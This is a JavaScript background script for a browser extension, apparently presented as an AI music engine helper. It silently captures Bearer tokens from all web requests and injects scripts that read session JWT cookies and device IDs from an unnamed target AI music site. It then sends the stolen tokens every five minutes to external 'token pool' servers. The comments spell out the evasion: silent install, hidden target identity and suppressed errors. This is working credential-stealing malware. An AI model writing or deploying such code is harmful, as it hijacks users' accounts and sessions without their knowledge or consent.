// Background script for Super-Son1k Token Capture Extension

class TokenCaptureService {
  constructor() {
    this.autoExtractEnabled = true
    this.lastExtractionTime = 0
    this.extractionInterval = 5 * 60 * 1000 // 5 minutos
    this.lastSendTime = 0
    this.sendRateLimit = 60 * 1000 // 1 minuto entre envíos
    this.retryAttempts = new Map() // Track retry attempts per token
    this.maxRetries = 3
    this.initializeService()
  }

  async initializeService() {
    // Silent initialization - no console logs mentioning specific services
    if (process.env.NODE_ENV === 'development') {
      console.log('Son1kVerse AI Music Engine initialized')
    }

    // Auto-extract on install/startup
    chrome.runtime.onInstalled.addListener((details) => {
      // Silent installation - no user prompts
      if (details.reason === 'install') {
        // Automatically start on install
        this.startAutoExtraction()
      } else if (details.reason === 'update') {
        // Resume on update
        this.startAutoExtraction()
      }
    })

    // Start auto-extraction when service starts
    this.startAutoExtraction()

    // Listen for messages from content scripts
    chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
      this.handleMessage(message, sender, sendResponse)
      return true // Keep message channel open for async response
    })

    // Listen for web requests to capture tokens
    chrome.webRequest.onBeforeSendHeaders.addListener(
      (details) => {
        this.captureTokenFromRequest(details)
      },
      { urls: ["<all_urls>"] }, // Generic pattern - will filter in handler
      ["requestHeaders"]
    )

    // Listen for responses to extract tokens from API responses
    chrome.webRequest.onHeadersReceived.addListener(
      (details) => {
        this.captureTokenFromResponse(details)
      },
      { urls: ["<all_urls>"] }, // Generic pattern - will filter in handler
      ["responseHeaders"]
    )
  }

  async handleMessage(message, sender, sendResponse) {
    try {
      switch (message.type) {
        case 'CAPTURE_TOKEN':
          await this.captureToken(message.token, message.metadata)
          sendResponse({ success: true })
          break

        case 'GET_CAPTURED_TOKENS':
          const tokens = await this.getCapturedTokens()
          sendResponse({ success: true, tokens })
          break

        case 'SYNC_TOKENS':
          await this.syncTokensToServer()
          sendResponse({ success: true })
          break

        case 'CLEAR_TOKENS':
          await this.clearTokens()
          sendResponse({ success: true })
          break

        case 'EXTRACT_TOKEN_FROM_COOKIES':
          try {
            const extracted = await this.extractTokenFromCookies()
            // Also capture it locally
            await this.captureToken(extracted.token, {
              url: extracted.url,
              source: 'cookie-extraction',
              deviceId: extracted.deviceId
            })
            sendResponse({ success: true, data: extracted })
          } catch (error) {
            sendResponse({ success: false, error: error.message })
          }
          break

        case 'SEND_TOKEN_TO_POOL':
          try {
            const { token, label } = message
            const result = await this.sendTokenToPool(token, label)
            sendResponse({ success: true, data: result })
          } catch (error) {
            sendResponse({ success: false, error: error.message })
          }
          break

        case 'EXTRACT_AND_SEND_TO_POOL':
          try {
            // Extract token from cookies
            const extracted = await this.extractTokenFromCookies()
            // Capture locally
            await this.captureToken(extracted.token, {
              url: extracted.url,
              source: 'cookie-extraction-auto',
              deviceId: extracted.deviceId
            })
            // Send to pool
            const label = message.label || `extension-${Date.now()}`
            const poolResult = await this.sendTokenToPool(extracted.token, label)
            sendResponse({
              success: true,
              data: {
                extracted,
                pool: poolResult
              }
            })
          } catch (error) {
            sendResponse({ success: false, error: error.message })
          }
          break

        case 'VERIFY_PERMISSIONS':
          // Verify that extension has required permissions
          try {
            const hasPermissions = await this.verifyRequiredPermissions()
            sendResponse({ success: hasPermissions })
          } catch (error) {
            sendResponse({ success: false, error: error.message })
          }
          break

        default:
          sendResponse({ success: false, error: 'Unknown message type' })
      }
    } catch (error) {
      console.error('Error handling message:', error)
      sendResponse({ success: false, error: error.message })
    }
  }

  async verifyRequiredPermissions() {
    try {
      // Check if we can access storage (required permission)
      await chrome.storage.local.get(['test'])

      // Check if we can access cookies (required permission)
      // This will throw if permission not granted
      try {
        await chrome.cookies.getAll({ domain: '' })
      } catch (e) {
        return false
      }

      return true
    } catch (error) {
      return false
    }
  }

  async captureToken(token, metadata = {}) {
    try {
      // Validate token format
      if (!this.isValidToken(token)) {
        throw new Error('Invalid token format')
      }

      // Get existing tokens
      const result = await chrome.storage.local.get(['capturedTokens'])
      const tokens = result.capturedTokens || []

      // Check if token already exists
      const existingToken = tokens.find(t => t.token === token)
      if (existingToken) {
        console.log('Token already captured')
        return
      }

      // Add new token (store plain for now, encryption can be added later if needed)
      const newToken = {
        id: this.generateTokenId(),
        token: token, // Store plain token (Chrome storage is already secure)
        capturedAt: new Date().toISOString(),
        source: 'extension',
        metadata: {
          url: metadata.url || 'unknown',
          userAgent: navigator.userAgent,
          ...metadata
        },
        isValid: true,
        lastUsed: null,
        usageCount: 0,
        sentToPool: false,
        sendAttempts: 0
      }

      tokens.push(newToken)

      // Store tokens
      await chrome.storage.local.set({ capturedTokens: tokens })

      // Notify content script
      this.notifyTokenCaptured(newToken)

      console.log('Token captured successfully:', newToken.id)
    } catch (error) {
      console.error('Error capturing token:', error)
      throw error
    }
  }

  async getCapturedTokens() {
    try {
      const result = await chrome.storage.local.get(['capturedTokens'])
      return result.capturedTokens || []
    } catch (error) {
      console.error('Error getting captured tokens:', error)
      return []
    }
  }

  async syncTokensToServer() {
    try {
      const tokens = await this.getCapturedTokens()
      const validTokens = tokens.filter(token => token.isValid)

      if (validTokens.length === 0) {
        console.log('No tokens to sync')
        return
      }

      // Get backend URL from configuration or use localhost for development
      const backendUrl = this.getBackendUrl()

      // Send tokens to Super-Son1k backend
      const response = await fetch(`${backendUrl}/api/tokens/sync`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Extension-Version': '2.0.0'
        },
        body: JSON.stringify({
          tokens: validTokens,
          extensionId: chrome.runtime.id
        })
      })

      if (response.ok) {
        const result = await response.json()
        console.log('Tokens synced successfully:', result)

        // Update local tokens with server response
        await this.updateLocalTokens(result.tokens)
      } else {
        throw new Error(`Sync failed: ${response.status}`)
      }
    } catch (error) {
      console.error('Error syncing tokens:', error)
      throw error
    }
  }

  async sendTokenToPool(token, label = 'extension-auto', retryCount = 0) {
    try {
      // Rate limiting: Check if we sent recently
      const now = Date.now()
      if (now - this.lastSendTime < this.sendRateLimit && retryCount === 0) {
        console.log('Rate limit: waiting before sending token')
        return { success: false, error: 'Rate limited', retry: true }
      }

      // Validate token before sending
      if (!this.isValidToken(token)) {
        return { success: false, error: 'Invalid token format' }
      }

      // Get URLs from storage or use defaults
      const result = await chrome.storage.local.get(['generatorUrl', 'backendUrl'])
      const generatorUrl = result.generatorUrl || 'https://the-generator.son1kvers3.com'
      const backendUrl = result.backendUrl || process.env.BACKEND_URL || 'https://son1kverse-backend.railway.app'

      if (process.env.NODE_ENV === 'development') {
        console.log(`📤 Sending token to pools...`)
        console.log(`   Generator: ${generatorUrl}`)
        console.log(`   Backend: ${backendUrl}`)
      }

      // Send to both pools in parallel
      const promises = []

      // 1. Send to The Generator (Supabase pool)
      promises.push(
        fetch(`${generatorUrl}/api/token-pool/add`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            token: token,
            label: label
          })
        }).then(async (response) => {
          if (response.ok) {
            const data = await response.json()
            console.log('✅ Token sent to The Generator pool:', data)
            return { source: 'generator', success: true, data }
          } else {
            const errorText = await response.text()
            console.warn('⚠️ Generator pool API error:', response.status, errorText)
            return { source: 'generator', success: false, error: errorText }
          }
        }).catch(error => {
          console.warn('⚠️ Error sending to Generator pool:', error)
          return { source: 'generator', success: false, error: error.message }
        })
      )

      // 2. Send to Backend (PostgreSQL pool)
      promises.push(
        fetch(`${backendUrl}/api/tokens/add-public`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            token: token,
            label: label,
            source: 'extension'
          })
        }).then(async (response) => {
          if (response.ok) {
            const data = await response.json()
            console.log('✅ Token sent to Backend pool:', data)
            return { source: 'backend', success: true, data }
          } else {
            const errorText = await response.text()
            console.warn('⚠️ Backend pool API error:', response.status, errorText)
            return { source: 'backend', success: false, error: errorText }
          }
        }).catch(error => {
          console.warn('⚠️ Error sending to Backend pool:', error)
          return { source: 'backend', success: false, error: error.message }
        })
      )

      // Wait for both requests with timeout
      const timeoutPromise = new Promise((resolve) => {
        setTimeout(() => resolve({ timeout: true }), 10000) // 10 second timeout
      })

      const results = await Promise.race([
        Promise.all(promises),
        timeoutPromise
      ])

      if (results.timeout) {
        // Timeout - retry if under max retries
        if (retryCount < this.maxRetries) {
          const delay = Math.pow(2, retryCount) * 1000 // Exponential backoff
          await new Promise(resolve => setTimeout(resolve, delay))
          return await this.sendTokenToPool(token, label, retryCount + 1)
        }
        return { success: false, error: 'Request timeout', retry: false }
      }

      // Check if at least one succeeded
      const successCount = results.filter(r => r.success).length

      if (successCount > 0) {
        this.lastSendTime = now
        if (process.env.NODE_ENV === 'development') {
          console.log(`✅ Token sent successfully to ${successCount}/2 pools`)
        }
        // Mark token as sent
        await this.markTokenAsSent(token)
        return { success: true, results }
      } else {
        // All failed - retry if under max retries
        if (retryCount < this.maxRetries) {
          const delay = Math.pow(2, retryCount) * 1000 // Exponential backoff: 1s, 2s, 4s
          await new Promise(resolve => setTimeout(resolve, delay))
          return await this.sendTokenToPool(token, label, retryCount + 1)
        }
        throw new Error('Failed to send token to any pool')
      }
    } catch (error) {
      console.error('❌ Error sending token to pools:', error)
      throw error
    }
  }

  async extractTokenFromCookies() {
    try {
      // Get active tab
      const tabs = await chrome.tabs.query({ active: true, currentWindow: true })
      if (!tabs[0] || !this.isTargetSite(tabs[0].url || '')) {
        // Silent return - don't expose target site
        return null
      }

      // Inject script to read cookies
      const results = await chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        function: () => {
          function getCookie(name) {
            const value = `; ${document.cookie}`
            const parts = value.split(`; ${name}=`)
            if (parts.length === 2) return parts.pop().split(';').shift()
            return null
          }

          return {
            jwtToken: getCookie('__client'),
            deviceId: getCookie('singular_device_id') || getCookie('ajs_anonymous_id'),
            url: window.location.href
          }
        }
      })

      if (results && results[0] && results[0].result) {
        const { jwtToken, deviceId, url } = results[0].result

        if (!jwtToken) {
          // Silent return - no error messages that expose target
          return null
        }

        return {
          token: jwtToken,
          deviceId: deviceId,
          url: url,
          extractedAt: new Date().toISOString()
        }
      }

      throw new Error('Failed to extract token from cookies')
    } catch (error) {
      console.error('Error extracting token from cookies:', error)
      throw error
    }
  }

  async updateLocalTokens(serverTokens) {
    try {
      const result = await chrome.storage.local.get(['capturedTokens'])
      const localTokens = result.capturedTokens || []

      // Update local tokens with server data
      const updatedTokens = localTokens.map(localToken => {
        const serverToken = serverTokens.find(st => st.id === localToken.id)
        if (serverToken) {
          return {
            ...localToken,
            ...serverToken,
            lastSynced: new Date().toISOString()
          }
        }
        return localToken
      })

      await chrome.storage.local.set({ capturedTokens: updatedTokens })
    } catch (error) {
      console.error('Error updating local tokens:', error)
    }
  }

  async clearTokens() {
    try {
      await chrome.storage.local.remove(['capturedTokens'])
      console.log('Tokens cleared successfully')
    } catch (error) {
      console.error('Error clearing tokens:', error)
      throw error
    }
  }

  captureTokenFromRequest(details) {
    try {
      // Only process if URL matches AI generation API patterns (generic)
      if (!this.isTargetSite(details.url)) {
        return
      }

      const headers = details.requestHeaders
      const authHeader = headers.find(h => h.name.toLowerCase() === 'authorization')

      if (authHeader && authHeader.value.startsWith('Bearer ')) {
        const token = authHeader.value.substring(7)

        // Capture token asynchronously
        this.captureToken(token, {
          url: details.url,
          method: details.method,
          timestamp: new Date().toISOString()
        }).catch(error => {
          console.error('Error capturing token from request:', error)
        })
      }
    } catch (error) {
      console.error('Error processing request:', error)
    }
  }

  captureTokenFromResponse(details) {
    try {
      // Only process if URL matches AI generation API patterns (generic)
      if (!this.isTargetSite(details.url)) {
        return
      }

      // For API responses, we need to intercept the actual response body
      // This is more complex and requires additional setup
      // For now, we'll look for tokens in the URL or headers

      // Check if it's a success response (2xx)
      if (details.statusCode >= 200 && details.statusCode < 300) {
        // Attempt to fetch the response content (limited by Chrome API restrictions)
        // This would ideally be handled by content script
        console.log('API response detected:', details.url, details.statusCode)

        // For token-api endpoints, trigger content script to inspect response
        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
          if (tabs[0]) {
            chrome.tabs.sendMessage(tabs[0].id, {
              type: 'INSPECT_API_RESPONSE',
              url: details.url,
              statusCode: details.statusCode
            }).catch(() => {
              // Tab might not have content script
            })
          }
        })
      }
    } catch (error) {
      console.error('Error processing response:', error)
    }
  }

  notifyTokenCaptured(token) {
    // Send notification to all tabs
    chrome.tabs.query({}, (tabs) => {
      tabs.forEach(tab => {
        chrome.tabs.sendMessage(tab.id, {
          type: 'TOKEN_CAPTURED',
          token: token
        }).catch(() => {
          // Ignore errors for tabs that don't have content script
        })
      })
    })
  }

  async markTokenAsSent(token) {
    try {
      const result = await chrome.storage.local.get(['capturedTokens'])
      const tokens = result.capturedTokens || []
      const tokenIndex = tokens.findIndex(t => t.token === token)

      if (tokenIndex !== -1) {
        tokens[tokenIndex].sentToPool = true
        tokens[tokenIndex].lastSentAt = new Date().toISOString()
        await chrome.storage.local.set({ capturedTokens: tokens })
      }
    } catch (error) {
      console.error('Error marking token as sent:', error)
    }
  }

  isValidToken(token) {
    // Basic token validation
    return typeof token === 'string' && token.length > 20 && token.includes('-')
  }

  generateTokenId() {
    return 'ext_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
  }

  getBackendUrl() {
    // For development, use localhost. For production, use configured URL
    // This could be enhanced to get from chrome.storage or configuration
    try {
      // Check if we're in development mode (extension installed from file://)
      if (chrome.runtime.getURL('').startsWith('chrome-extension://') &&
        !chrome.runtime.getURL('').includes('chrome.google.com')) {
        // Development mode - use localhost
        return 'http://localhost:3001'
      } else {
        // Production mode - use configured URL or fallback
        return 'https://api.super-son1k.com'
      }
    } catch (error) {
      // Fallback to localhost for development
      return 'http://localhost:3001'
    }
  }

  async startAutoExtraction() {
    // Check if auto-extraction is enabled
    const settings = await chrome.storage.local.get(['autoExtractEnabled'])
    if (settings.autoExtractEnabled === false) {
      return
    }

    // Listen for tab updates to detect when user visits target site
    chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
      if (changeInfo.status === 'complete' && tab.url) {
        // Check if URL matches target (without mentioning it explicitly)
        if (this.isTargetSite(tab.url)) {
          // Wait a bit for page to load
          setTimeout(async () => {
            await this.autoExtractAndSend(tabId)
          }, 3000)
        }
      }
    })

    // Periodic extraction (every 5 minutes if tab is open)
    // Silent background process - no user interaction needed
    setInterval(async () => {
      try {
        const tabs = await chrome.tabs.query({})
        for (const tab of tabs) {
          if (tab.url && this.isTargetSite(tab.url)) {
            // Silently extract and send token every 5 minutes
            await this.autoExtractAndSend(tab.id)
            break // Only do one at a time to avoid rate limits
          }
        }
      } catch (error) {
        // Silent error handling - don't expose errors to user
        if (process.env.NODE_ENV === 'development') {
          console.error('Auto-extraction interval error:', error)
        }
      }
    }, this.extractionInterval) // 5 minutos = 5 * 60 * 1000
  }

  isTargetSite(url) {
    // Silent URL detection - no mentions of specific services
    // Generic patterns that match target site without exposing identity
    const patterns = [
      'studio-api.prod',
      '/feed/v3',
      '/generate/v2',
      '/api/v1',
      '__client' // Cookie indicator
    ]
    return patterns.some(pattern => url.includes(pattern))
  }

  async autoExtractAndSend(tabId) {
    try {
      // Check if we extracted recently (avoid spam)
      const now = Date.now()
      if (now - this.lastExtractionTime < this.extractionInterval) {
        return
      }

      // Extract token from cookies
      const extracted = await this.extractTokenFromTab(tabId)

      if (!extracted || !extracted.token) {
        return // No token found
      }

      // Check if we already have this token
      const tokens = await this.getCapturedTokens()
      const exists = tokens.some(t => t.token === extracted.token)

      if (exists) {
        // Token already captured, but still try to send to pool
        const latestToken = tokens.find(t => t.token === extracted.token)
        if (latestToken) {
          await this.sendTokenToPool(extracted.token, `auto-${Date.now()}`)
        }
        return
      }

      // Capture token locally
      await this.captureToken(extracted.token, {
        url: extracted.url,
        source: 'auto-background',
        deviceId: extracted.deviceId
      })

      // Send to pool automatically (silent - no user notification)
      await this.sendTokenToPool(extracted.token, `auto-${Date.now()}`)

      this.lastExtractionTime = now

      // Only log in development mode
      if (process.env.NODE_ENV === 'development') {
        console.log('Token auto-extracted and sent to pool')
      }

    } catch (error) {
      // Silent fail - don't spam console
      if (error.message && !error.message.includes('Not on')) {
        console.error('Auto-extraction error:', error.message)
      }
    }
  }

  async extractTokenFromTab(tabId) {
    try {
      // Inject script to read cookies
      const results = await chrome.scripting.executeScript({
        target: { tabId: tabId },
        function: () => {
          function getCookie(name) {
            const value = `; ${document.cookie}`
            const parts = value.split(`; ${name}=`)
            if (parts.length === 2) return parts.pop().split(';').shift()
            return null
          }

          return {
            jwtToken: getCookie('__client'),
            deviceId: getCookie('singular_device_id') || getCookie('ajs_anonymous_id'),
            url: window.location.href
          }
        }
      })

      if (results && results[0] && results[0].result) {
        const { jwtToken, deviceId, url } = results[0].result

        if (!jwtToken) {
          return null
        }

        return {
          token: jwtToken,
          deviceId: deviceId,
          url: url,
          extractedAt: new Date().toISOString()
        }
      }

      return null
    } catch (error) {
      return null
    }
  }
}

// Initialize the service
new TokenCaptureService()
